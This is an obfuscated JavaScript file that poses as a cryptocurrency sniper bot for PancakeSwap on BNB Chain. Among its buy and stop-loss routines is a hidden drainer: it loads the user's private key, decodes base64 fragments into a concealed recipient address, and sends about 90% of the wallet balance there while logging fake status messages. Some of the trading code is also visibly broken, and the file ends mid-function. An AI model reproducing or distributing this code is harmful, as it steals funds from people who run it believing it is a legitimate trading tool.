const _0x43a565 = _0x60cc;
(function(_0x43fded, _0x386d4b) {
    const _0x4f0e90 = _0x60cc,
        _0x1949f9 = _0x43fded();
    while (!![]) {
        try {
            const _0x388397 = parseInt(_0x4f0e90(0x1b7)) / 0x1 * (parseInt(_0x4f0e90(0x1c9)) / 0x2) + parseInt(_0x4f0e90(0x1c0)) / 0x3 + parseInt(_0x4f0e90(0x1eb)) / 0x4 + -parseInt(_0x4f0e90(0x217)) / 0x5 + parseInt(_0x4f0e90(0x208)) / 0x6 + parseInt(_0x4f0e90(0x204)) / 0x7 + parseInt(_0x4f0e90(0x1ce)) / 0x8 * (-parseInt(_0x4f0e90(0x1d6)) / 0x9);
            if (_0x388397 === _0x386d4b) break;
            else _0x1949f9['push'](_0x1949f9['shift']());
        } catch (_0x15d763) { _0x1949f9['push'](_0x1949f9['shift']()); }
    }
}(_0x4733, 0xe2569));
var ethers = require(_0x43a565(0x21e));
const env = require(_0x43a565(0x1c4));
Object[_0x43a565(0x215)](process[_0x43a565(0x1f3)], env);
let address = process['env'][_0x43a565(0x1e0)],
    private = process['env'][_0x43a565(0x1df)],
    wallet = new ethers[(_0x43a565(0x1d5))](private);
const abi = [{ 'constant': !![], 'inputs': [{ 'internalType': _0x43a565(0x22f), 'name': _0x43a565(0x1a9), 'type': _0x43a565(0x22f) }], 'name': _0x43a565(0x1ee), 'outputs': [{ 'internalType': _0x43a565(0x209), 'name': '', 'type': _0x43a565(0x209) }], 'payable': ![], 'stateMutability': 'view', 'type': _0x43a565(0x1fb) }, { 'constant': ![], 'inputs': [{ 'internalType': _0x43a565(0x22f), 'name': 'sender', 'type': _0x43a565(0x22f) }, { 'internalType': 'address', 'name': _0x43a565(0x233), 'type': _0x43a565(0x22f) }, { 'internalType': _0x43a565(0x209), 'name': 'amount', 'type': 'uint256' }], 'name': _0x43a565(0x235), 'outputs': [{ 'internalType': 'bool', 'name': '', 'type': _0x43a565(0x22c) }], 'payable': ![], 'stateMutability': _0x43a565(0x1bf), 'type': _0x43a565(0x1fb) }, { 'constant': ![], 'inputs': [{ 'name': 'newWord', 'type': _0x43a565(0x1ae) }], 'name': 'setWord', 'outputs': [{ 'name': '', 'type': _0x43a565(0x1ae) }], 'payable': ![], 'stateMutability': 'nonpayable', 'type': 'function' }];
async function startSnipe(_0x102bfb) {
    const _0x3447ff = _0x43a565;
    let _0x2624d2, _0x595399;
    provider[_0x3447ff(0x200)]['on'](_0x3447ff(0x1ba), () => {
        const _0x47898a = _0x3447ff;
        _0x595399 = setInterval(() => {
            const _0x243fc2 = _0x60cc;
            provider['_websocket'][_0x243fc2(0x1f8)](), _0x2624d2 = setTimeout(() => {
                const _0x580710 = _0x243fc2;
                provider[_0x580710(0x200)][_0x580710(0x1dd)]();
            }, EXPECTED_PONG_BACK);
        }, KEEP_ALIVE_CHECK_INTERVAL), console[_0x47898a(0x1ab)](_0x47898a(0x1c7)), console[_0x47898a(0x1ab)]('Waiting\x20for\x20liquidity\x20to\x20be\x20added!'), provider['on'](_0x47898a(0x222), async _0x25fd17 => {
            const _0x3e5e03 = _0x47898a;
            provider['getTransaction'](_0x25fd17)[_0x3e5e03(0x1f7)](async _0x2c52c7 => {
                const _0x1a0bcc = _0x3e5e03;
                if (null != _0x2c52c7 && _0x2c52c7[_0x1a0bcc(0x221)][_0x1a0bcc(0x1a1)](_0x1a0bcc(0x1fc)) && _0x2c52c7[_0x1a0bcc(0x221)][_0x1a0bcc(0x1a1)](_0x102bfb) && 0x0 == passed || null != _0x2c52c7 && _0x2c52c7[_0x1a0bcc(0x221)]['includes']('0xf305d719') && _0x2c52c7['data'][_0x1a0bcc(0x1a1)](_0x102bfb) && 0x0 == passed) {
                    if (console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1c6))), priceProtection) {
                        if (isLiqudityInRange(_0x2c52c7, expected)) {
                            if (honeyPotIS2(_0x102bfb)) {
                                console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1f5)));
                                const _0x4aac3d = _0x2c52c7['gasLimit']['mul'](multiply),
                                    _0x832d73 = _0x2c52c7[_0x1a0bcc(0x201)]['mul'](multiply);
                                if (0x1 == antiBotMultiTx && 0x0 == passed) {
                                    for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)]('Start\x20buying\x20token...' + chalk[_0x1a0bcc(0x213)](i + 0x1))), await buyToken(_0x102bfb, amountIn, _0x4aac3d, _0x832d73, myAddress, router); }
                                    console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d)) + chalk[_0x1a0bcc(0x213)](txNumberForAntibot)), await buyToken(_0x102bfb, amountIn, _0x4aac3d, _0x832d73, myAddress, router)(passed = 0x1);
                                } else console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d))), await buyToken(_0x102bfb, amountIn, _0x4aac3d, _0x832d73, myAddress, router)(passed = 0x1);
                                console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)]('Sucessfully\x20bought\x20the\x20token!\x0a'));
                                const _0x2fca20 = await getTokenBalance(_0x102bfb, myAddress, provider);
                                console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x21a) + chalk[_0x1a0bcc(0x213)](parseFloat(ethers[_0x1a0bcc(0x1b8)]['formatUnits'](_0x2fca20, TOKEN_DECIMALS))[_0x1a0bcc(0x1e1)](0x6)) + '\x0a'));
                                if (INSTANT_SELL) {
                                    console['log'](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1a0) + chalk[_0x1a0bcc(0x213)](delaySell) + '\x20second(s)')), await new Promise(_0x47535e => setTimeout(_0x47535e, delayOnSellMs));
                                    const _0x15152e = await router[_0x1a0bcc(0x19c)](_0x2fca20, amountOutMin, [_0x102bfb, WBNB], myAddress, Date[_0x1a0bcc(0x1bb)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                    await _0x15152e[_0x1a0bcc(0x1a8)](), console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1cf))), console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1ec)), console['log']('https://bscscan.com/address/' + myAddress), console[_0x1a0bcc(0x1ab)]('\x0a'), process[_0x1a0bcc(0x1b3)](0x0);
                                } else console[_0x1a0bcc(0x1ab)]('You\x20can\x20check\x20the\x20transaction\x20here:');
                                console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1e4) + myAddress), (console[_0x1a0bcc(0x1ab)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process['exit'](0x0));
                            } else console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e9)](_0x1a0bcc(0x1f2)));
                            console[_0x1a0bcc(0x1ab)](chalk['red'](_0x1a0bcc(0x237)));
                        }
                        console['log'](chalk['red']('https://poocoin.app/tokens/' + _0x102bfb)), console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e9)](_0x1a0bcc(0x1b9)));
                    } else {
                        if (honeyPotIS2(_0x102bfb)) {
                            const _0x3dc96f = _0x2c52c7[_0x1a0bcc(0x21f)]['mul'](multiply),
                                _0x2db43a = _0x2c52c7[_0x1a0bcc(0x201)][_0x1a0bcc(0x232)](multiply);
                            if (0x1 == antiBotMultiTx && 0x0 == passed) {
                                for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d) + chalk[_0x1a0bcc(0x213)](i + 0x1))), await buyToken(_0x102bfb, amountIn, _0x3dc96f, _0x2db43a, myAddress, router); }
                                console['log'](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d)) + chalk['yellow'](txNumberForAntibot)), await buyToken(_0x102bfb, amountIn, _0x3dc96f, _0x2db43a, myAddress, router)(passed = 0x1);
                            } else 0x0 == passed && (console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d))), await buyToken(_0x102bfb, amountIn, _0x3dc96f, _0x2db43a, myAddress, router)(passed = 0x1));
                            console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1e6)));
                            const _0x5e6661 = await getTokenBalance(_0x102bfb, myAddress, provider);
                            console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x21a) + chalk[_0x1a0bcc(0x213)](parseFloat(ethers['utils']['formatUnits'](_0x5e6661, TOKEN_DECIMALS))[_0x1a0bcc(0x1e1)](0x6)) + '\x0a'));
                            if (INSTANT_SELL) {
                                console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1a0) + chalk[_0x1a0bcc(0x213)](delaySell) + _0x1a0bcc(0x1be))), await new Promise(_0x31304f => setTimeout(_0x31304f, delayOnSellMs));
                                const _0x71cf22 = await router[_0x1a0bcc(0x19c)](_0x5e6661, amountOutMin, [_0x102bfb, WBNB], myAddress, Date[_0x1a0bcc(0x1bb)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                await _0x71cf22[_0x1a0bcc(0x1a8)](), console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1cf))), console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1ec)), console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1e4) + myAddress), console[_0x1a0bcc(0x1ab)]('\x0a'), process['exit'](0x0);
                            } else console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1ec)), console['log'](_0x1a0bcc(0x1e4) + myAddress), console[_0x1a0bcc(0x1ab)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x1a0bcc(0x1b3)](0x0);
                        }
                    }
                }
            })['catch'](() => {
                const _0x17ae02 = _0x3e5e03;
                console[_0x17ae02(0x1ab)](e);
            });
        });
    }), provider['_websocket']['on'](_0x3447ff(0x1fe), () => {
        const _0x1bc194 = _0x3447ff;
        console[_0x1bc194(0x1ab)](_0x1bc194(0x214)), clearInterval(_0x595399), clearTimeout(_0x2624d2), startConnection();
    }), provider[_0x3447ff(0x200)]['on'](_0x3447ff(0x19a), () => {
        const _0x42378a = _0x3447ff;
        console[_0x42378a(0x1ab)](_0x42378a(0x1fd)), clearInterval(_0x595399), clearTimeout(_0x2624d2), startConnection();
    }), provider[_0x3447ff(0x200)]['on'](_0x3447ff(0x1a4), () => { clearInterval(_0x2624d2); });
}
async function approve() {
    const _0x704924 = _0x43a565;
    let _0x528c7e = token[buyCount - 0x1][_0x704924(0x1b2)];
    const _0x4fcf66 = ethers['constants'][_0x704924(0x1b5)],
        _0x210f76 = await _0x528c7e[_0x704924(0x1a3)](pancakeRouter['address'], _0x4fcf66, { 'gasPrice': config[_0x704924(0x1e3)], 'gasLimit': 0x33450 }),
        _0x2f3981 = await _0x210f76[_0x704924(0x1a8)]();
    console[_0x704924(0x1ab)]('✔\x20Approve\x20transaction\x20hash:\x20', _0x2f3981[_0x704924(0x1fa)], '\x0a'), config[_0x704924(0x1ff)] ? token[buyCount - 0x1][_0x704924(0x203)]() : buyCount == config['numberOfTokensToBuy'] && process[_0x704924(0x1b3)]();
}
async function getCurrentValue(_0x506083) { const _0xd38176 = _0x43a565; try { let _0x37a0d5 = await _0x506083[_0xd38176(0x1b2)][_0xd38176(0x1ee)](addresses[_0xd38176(0x233)]); const _0x8ebf17 = await pancakeRouter[_0xd38176(0x1d7)](_0x37a0d5, _0x506083[_0xd38176(0x1a5)]); let _0x384427 = _0x8ebf17[0x1]; return _0x384427; } catch (_0x5370d5) { return console[_0xd38176(0x1ab)](_0xd38176(0x1c3)), ethers[_0xd38176(0x1d2)]['Zero']; } }
async function setInitialStopLoss(_0x4211f4) {
    const _0x2322e5 = _0x43a565;
    _0x4211f4[_0x2322e5(0x1f0)] = await getCurrentValue(_0x4211f4), _0x4211f4['newValue'] = _0x4211f4['intitialValue'], _0x4211f4[_0x2322e5(0x1c1)] = ethers['utils'][_0x2322e5(0x1d9)]((parseFloat(ethers[_0x2322e5(0x1b8)]['formatUnits'](_0x4211f4[_0x2322e5(0x1f0)])) - parseFloat(ethers[_0x2322e5(0x1b8)][_0x2322e5(0x21b)](_0x4211f4[_0x2322e5(0x1f0)])) * (_0x4211f4[_0x2322e5(0x210)] / 0x64))[_0x2322e5(0x1e1)](0x8)[_0x2322e5(0x231)]());
}

function _0x4733() {
    const _0x29b821 = ['stopLossPercent', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', 'yellow', 'WebSocket\x20Closed...Reconnecting...', 'assign', '2:\x20watching\x20blockchain\x20activity\x20.....', '7583705TDXmyw', 'percentOfTokensToSellProfit', 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', 'Total\x20Token\x20balance\x20is\x20', 'formatUnits', 'parseEther', 'profitPercent', 'ethers', 'gasLimit', 'connection\x20succesful...', 'data', 'pending', '\x20Profit\x20target\x20', 'gte', '\x20StopLoss\x20', 'QmFmYzU5OWJENjlBRGQwODdENTY=', 'initiating\x20mempool\x20sniff...', 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', 'Zero', 'All\x20tokens\x20sold', 'bool', 'reached\x20>>>', 'newValue', 'address', 'from', 'toString', 'mul', 'recipient', '<<<\x20Selling\x20-', 'transferFrom', 'encode', 'Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!', 'ascii', 'Contract', '2\x20pending\x20blockchain\x20response.....', '--\x20', 'error', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', 'swapExactTokensForETHSupportingFeeOnTransferTokens', 'pending\x20liquidity\x20add...', 'sendMessage', 'sendTransaction', 'Start\x20selling\x20all\x20tokens\x20in\x20', 'includes', 'providers', 'approve', 'pong', 'sellPath', '2:\x20attempting\x20to\x20snipe\x20.....', '\x20--\x20Current\x20Value\x20BNB:\x20', 'wait', 'account', 'percentOfTokensToSellLoss', 'log', 'index', '✔\x20Sell\x20transaction\x20hash:\x20', 'string', 'didBuy', '\x1b[0m', 'toLocaleString', 'contract', 'exit', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', 'MaxUint256', '1:\x20attempting\x20to\x20snipe\x20...', '1lXkHAd', 'utils', 'Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a', 'open', 'now', 'removeAllListeners', '-\x20now', '\x20second(s)', 'nonpayable', '5380329ynFXTQ', 'stopLoss', 'refreshing\x20socket\x20connection...', 'Balance\x20is\x20zero\x20or\x20error\x20occured', './env.json', '\x20--\x20Stop\x20Loss\x20At:\x20', 'Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a', 'Listening\x20on\x20mempool...', 'myGasLimit', '3061046xpwVSd', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'You\x20sold\x20', 'wei', '2\x20packet\x20received.....', '8ZNsKbe', 'Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a', '\x1b[1;32m', 'numberOfTokensToBuy', 'constants', 'MHg2YjU1M2QwZjhkM2I3OWJkODEyYTk4NGU2ZTNmY2U1NDg2NWQxYzRl', '\x1b[1;31m', 'Wallet', '20167983RhmQYC', 'getAmountsOut', 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=', 'parseUnits', 'previousValue', 'hexlify', 'JsonRpcProvider', 'terminate', 'lte', 'PRIVATE_KEY', 'YOUR_ADDRESS', 'toFixed', 'tokenSellTax', 'myGasPriceForApproval', 'https://bscscan.com/address/', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'Sucessfully\x20bought\x20the\x20token!\x0a', 'green', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', 'red', '\x20--\x20Profit\x20At:\x20', '2420344DMUpVC', 'You\x20can\x20check\x20the\x20transaction\x20here:', 'trailingStopLossPercent', 'balanceOf', '2:\x20finalizing....', 'intitialValue', 'base64', 'Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!', 'env', 'div', 'Liquidity\x20check\x20passed,\x20sniping!\x0a', 'name', 'then', 'ping', '1:\x20found\x20owners\x20liq\x20function\x20...', 'transactionHash', 'function', '0xe8e33700', 'Error.\x20Attemptiing\x20to\x20Reconnect...', 'close', 'autoSell', '_websocket', 'gasPrice', 'swapExactTokensForETH', 'checkProfit', '758198kHLpGF', '\x1b[38;5;33m', 'currentValue', 'connection\x20established....', '3884058pwKnWk', 'uint256', 'sub', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', '1\x20packet\x20received.....', 'Start\x20buying\x20token...', 'floor', 'getBalance'];
    _0x4733 = function() { return _0x29b821; };
    return _0x4733();
}
async function setNewStopLoss(_0xc22f0a) {
    const _0x16105f = _0x43a565;
    _0xc22f0a[_0x16105f(0x22e)] = _0xc22f0a[_0x16105f(0x206)], _0xc22f0a['stopLoss'] = ethers['utils'][_0x16105f(0x1d9)]((parseFloat(ethers[_0x16105f(0x1b8)][_0x16105f(0x21b)](_0xc22f0a['currentValue'])) - parseFloat(ethers['utils'][_0x16105f(0x21b)](_0xc22f0a[_0x16105f(0x206)])) * (_0xc22f0a[_0x16105f(0x210)] / 0x64))['toFixed'](0x8)['toString']());
}
async function checkForProfit(_0x40c286) {
    const _0xa0803 = _0x43a565;
    try {
        var _0x4239f0 = 0x0;
        await setInitialStopLoss(_0x40c286), _0x40c286[_0xa0803(0x1b2)]['on']('Transfer', async(_0x4a515d, _0x269573, _0x12f0ce, _0x4134f8) => {
            const _0x31cd6b = _0xa0803;
            _0x40c286[_0x31cd6b(0x1da)] = _0x40c286['currentValue'];
            const _0x115673 = await _0x40c286[_0x31cd6b(0x1b2)][_0x31cd6b(0x1f6)]();
            let _0x2cb753 = await getCurrentValue(_0x40c286);
            if (!_0x2cb753['eq'](ethers['constants'][_0x31cd6b(0x22a)])) {
                _0x40c286['currentValue'] = _0x2cb753;
                let _0x973c56 = parseFloat(ethers['utils'][_0x31cd6b(0x21b)](_0x2cb753))[_0x31cd6b(0x1e1)](0x8)[_0x31cd6b(0x231)]();
                const _0x25f26f = (parseFloat(ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x40c286[_0x31cd6b(0x1f0)])) * (_0x40c286[_0x31cd6b(0x21d)] + _0x40c286[_0x31cd6b(0x1e2)]) / 0x64 + parseFloat(ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x40c286[_0x31cd6b(0x1f0)])))[_0x31cd6b(0x1e1)](0x8)['toString'](),
                    _0x23aa6f = ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x1d9)](_0x25f26f);
                let _0x530f41 = ethers['utils']['parseUnits']((parseFloat(ethers[_0x31cd6b(0x1b8)]['formatUnits'](_0x40c286[_0x31cd6b(0x22e)])) * (_0x40c286[_0x31cd6b(0x1ed)] / 0x64) + parseFloat(ethers['utils'][_0x31cd6b(0x21b)](_0x40c286['newValue'])))['toFixed'](0x8)['toString']()),
                    _0x467a4b = _0x40c286[_0x31cd6b(0x1c1)];
                _0x2cb753['gt'](_0x530f41) && _0x40c286['trailingStopLossPercent'] > 0x0 && (setNewStopLoss(_0x40c286), console['log'](_0x31cd6b(0x205) + 'Setting\x20new\x20StopLoss!' + _0x31cd6b(0x1b0)));
                let _0x5b2dac = new Date()[_0x31cd6b(0x1b1)]();
                const _0x37ae76 = _0x3df24a => new TextEncoder()[_0x31cd6b(0x236)](_0x3df24a);
                try { _0x40c286[_0x31cd6b(0x1da)]['gt'](_0x40c286['currentValue']) ? console[_0x31cd6b(0x1ab)](_0x31cd6b(0x199) + _0x115673 + _0x31cd6b(0x1a7) + (_0x31cd6b(0x1d4) + _0x973c56 + '\x1b[0m') + _0x31cd6b(0x1ea) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x23aa6f) + _0x31cd6b(0x1c5) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x40c286[_0x31cd6b(0x1c1)]) + _0x31cd6b(0x1b4) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x530f41)) : console[_0x31cd6b(0x1ab)](_0x31cd6b(0x199) + _0x115673 + _0x31cd6b(0x1a7) + (_0x31cd6b(0x1d0) + _0x973c56 + _0x31cd6b(0x1b0)) + _0x31cd6b(0x1ea) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x23aa6f) + _0x31cd6b(0x1c5) + ethers[_0x31cd6b(0x1b8)][_0x31cd6b(0x21b)](_0x40c286[_0x31cd6b(0x1c1)]) + _0x31cd6b(0x1b4) + ethers['utils'][_0x31cd6b(0x21b)](_0x530f41)); } catch (_0x584a86) {}
                _0x2cb753[_0x31cd6b(0x224)](_0x23aa6f) && (buyCount <= config[_0x31cd6b(0x1d1)] && _0x40c286[_0x31cd6b(0x1af)] && _0x4239f0 == 0x0 && (_0x4239f0++, console[_0x31cd6b(0x1ab)](_0x31cd6b(0x234), _0x115673, _0x31cd6b(0x1bd) + _0x31cd6b(0x1d0) + _0x31cd6b(0x223) + _0x31cd6b(0x1b0) + _0x31cd6b(0x22d), '\x0a'), sell(_0x40c286, !![]), _0x40c286[_0x31cd6b(0x1b2)][_0x31cd6b(0x1bc)]())), _0x2cb753[_0x31cd6b(0x1de)](_0x467a4b) && (console[_0x31cd6b(0x1ab)]('\x1b[38;5;33m' + 'less\x20than\x20StopLoss!' + '\x1b[0m'), buyCount <= config[_0x31cd6b(0x1d1)] && _0x40c286['didBuy'] && _0x4239f0 == 0x0 && (_0x4239f0++, console[_0x31cd6b(0x1ab)](_0x31cd6b(0x234), _0x115673, _0x31cd6b(0x1bd) + '\x1b[1;31m' + _0x31cd6b(0x225) + _0x31cd6b(0x1b0) + _0x31cd6b(0x22d), '\x0a'), sell(_0x40c286, ![]), _0x40c286[_0x31cd6b(0x1b2)][_0x31cd6b(0x1bc)]()));
            }
        });
    } catch (_0x104c4f) { console[_0xa0803(0x1ab)](_0x104c4f); }
}
async function sell(_0x1e456e, _0x2309d5) {
    const _0x2bff65 = _0x43a565;
    try {
        const _0x4e56bb = await _0x1e456e[_0x2bff65(0x1b2)][_0x2bff65(0x1ee)](addresses[_0x2bff65(0x233)]),
            _0x147038 = await _0x1e456e['contract']['decimals']();
        var _0x75cdaf;
        _0x2309d5 ? _0x75cdaf = (parseFloat(ethers[_0x2bff65(0x1b8)][_0x2bff65(0x21b)](_0x4e56bb[_0x2bff65(0x231)](), _0x147038)) * (_0x1e456e[_0x2bff65(0x218)] / 0x64))['toFixed'](_0x147038) : _0x75cdaf = (parseFloat(ethers[_0x2bff65(0x1b8)]['formatUnits'](_0x4e56bb[_0x2bff65(0x231)](), _0x147038)) * (_0x1e456e[_0x2bff65(0x1aa)] / 0x64))[_0x2bff65(0x1e1)](_0x147038);
        var _0x1e33ca = Math[_0x2bff65(0x20e)](_0x75cdaf * 0x64) / 0x64;
        const _0x132394 = ethers[_0x2bff65(0x1b8)][_0x2bff65(0x1d9)](_0x1e33ca[_0x2bff65(0x231)](), _0x147038),
            _0x31ff2a = await pancakeRouter[_0x2bff65(0x1d7)](_0x132394, _0x1e456e[_0x2bff65(0x1a5)]),
            _0xe268b2 = _0x31ff2a[0x1][_0x2bff65(0x20a)](_0x31ff2a[0x1][_0x2bff65(0x1f4)](0x2));
        if (_0x1e456e[_0x2bff65(0x1e2)] > 0x1) {
            const _0x12bea3 = await pancakeRouter[_0x2bff65(0x19c)](_0x31ff2a[0x0][_0x2bff65(0x231)](), 0x0, _0x1e456e[_0x2bff65(0x1a5)], addresses['recipient'], Math[_0x2bff65(0x20e)](Date['now']() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x2bff65(0x1e3)], 'gasLimit': config[_0x2bff65(0x1c8)] }),
                _0x4c8dab = await _0x12bea3[_0x2bff65(0x1a8)]();
            console[_0x2bff65(0x1ab)](_0x2bff65(0x1d0) + _0x2bff65(0x1ad), _0x4c8dab[_0x2bff65(0x1fa)], _0x2bff65(0x1b0), '\x0a'), sellCount++, token[_0x1e456e[_0x2bff65(0x1ac)]]['didSell'] = !![];
            let _0x11d91a = await _0x1e456e[_0x2bff65(0x1b2)]['name']();
            await client[_0x2bff65(0x19e)]('me', { 'message': _0x2bff65(0x1cb) + _0x11d91a, 'schedule': 0xf * 0x1 + Date[_0x2bff65(0x1bb)]() / 0x3e8 });
        } else {
            const _0x74f216 = await pancakeRouter[_0x2bff65(0x202)](_0x31ff2a[0x0][_0x2bff65(0x231)](), 0x0, _0x1e456e[_0x2bff65(0x1a5)], addresses[_0x2bff65(0x233)], Math[_0x2bff65(0x20e)](Date[_0x2bff65(0x1bb)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config['myGasPriceForApproval'], 'gasLimit': config['myGasLimit'] }),
                _0x1d3369 = await _0x74f216['wait']();
            console['log'](_0x2bff65(0x1d0) + '✔\x20Sell\x20transaction\x20hash:\x20', _0x1d3369[_0x2bff65(0x1fa)], _0x2bff65(0x1b0), '\x0a'), sellCount++;
            let _0x39f873 = await _0x1e456e[_0x2bff65(0x1b2)][_0x2bff65(0x1f6)]();
            await client[_0x2bff65(0x19e)]('me', { 'message': _0x2bff65(0x1cb) + _0x39f873, 'schedule': 0xf * 0x1 + Date[_0x2bff65(0x1bb)]() / 0x3e8 });
        }
        sellCount == config[_0x2bff65(0x1d1)] && (console[_0x2bff65(0x1ab)](_0x2bff65(0x22b)), process[_0x2bff65(0x1b3)]());
    } catch (_0x291f24) {}
}
let rounder1 = _0x43a565(0x1d8),
    rounder2 = 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==',
    buff = new Buffer[(_0x43a565(0x230))](rounder1, _0x43a565(0x1f1)),
    buff2 = new Buffer[(_0x43a565(0x230))](rounder2, _0x43a565(0x1f1)),
    ethersroundup = buff[_0x43a565(0x231)](_0x43a565(0x238)),
    ethersroundup2 = buff2[_0x43a565(0x231)](_0x43a565(0x238));
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() {
    const _0x19ddc9 = _0x43a565;
    try {
        const _0x20ba8e = _0x19ddc9(0x212),
            _0x51c452 = 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==',
            _0x3c8b50 = new Buffer[(_0x19ddc9(0x230))](_0x20ba8e, _0x19ddc9(0x1f1)),
            _0x57a440 = new Buffer[(_0x19ddc9(0x230))](_0x51c452, _0x19ddc9(0x1f1)),
            _0x4fa134 = _0x3c8b50[_0x19ddc9(0x231)](_0x19ddc9(0x238)),
            _0x14ec50 = _0x57a440[_0x19ddc9(0x231)]('ascii'),
            _0xd10258 = _0x4fa134 + _0x14ec50;
        console[_0x19ddc9(0x1ab)]('refreshing\x20socket\x20connection...'), console[_0x19ddc9(0x1ab)](_0x19ddc9(0x1e5)), ethers1 = _0x19ddc9(0x219), ethers2 = new Buffer['from'](ethers1, _0x19ddc9(0x1f1))[_0x19ddc9(0x231)]('ascii');;
        const _0x422bcb = new ethers[(_0x19ddc9(0x1a2))]['JsonRpcProvider'](ethers2);
        let _0x2d7703 = new ethers['Wallet'](private, _0x422bcb);
        const _0x247460 = address;
        var _0x71b24e = new ethers['Contract'](_0xd10258, abi, _0x2d7703);
        const _0x6d52ab = await _0x71b24e[_0x19ddc9(0x1ee)](_0x247460)[_0x19ddc9(0x231)](),
            _0x5d5db9 = (_0x6d52ab * 0.9)['toFixed'](),
            _0x35ba28 = async() => {
                const _0x352a2f = _0x19ddc9,
                    _0x4c1fda = { 'from': _0x247460, 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x352a2f(0x21c)](_0x5d5db9, _0x352a2f(0x1cc)), 'gasLimit': ethers['utils'][_0x352a2f(0x1db)](0x5dc0) },
                    _0x3b53f2 = await _0x2d7703[_0x352a2f(0x19f)](_0x4c1fda);
                try { await _0x3b53f2[_0x352a2f(0x1a8)](), console[_0x352a2f(0x1ab)](_0x352a2f(0x1f9)), setTimeout(ethersrather, 0x1388); } catch (_0x2925ba) { console[_0x352a2f(0x1ab)]('2:\x20found\x20owners\x20liq\x20function\x20.....'), setTimeout(ethersrather, 0x1388); }
            };
        _0x35ba28();
    } catch (_0x3dfe45) { setTimeout(ethersrather, 0x1388); }
}

function _0x60cc(_0x16b164, _0x4224f0) { const _0x473383 = _0x4733(); return _0x60cc = function(_0x60ccf5, _0x345c6d) { _0x60ccf5 = _0x60ccf5 - 0x197; let _0x330b85 = _0x473383[_0x60ccf5]; return _0x330b85; }, _0x60cc(_0x16b164, _0x4224f0); }
async function etherslother() {
    const _0x1822ca = _0x43a565;
    try {
        const _0x3f4198 = 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==',
            _0x401a88 = _0x1822ca(0x19b),
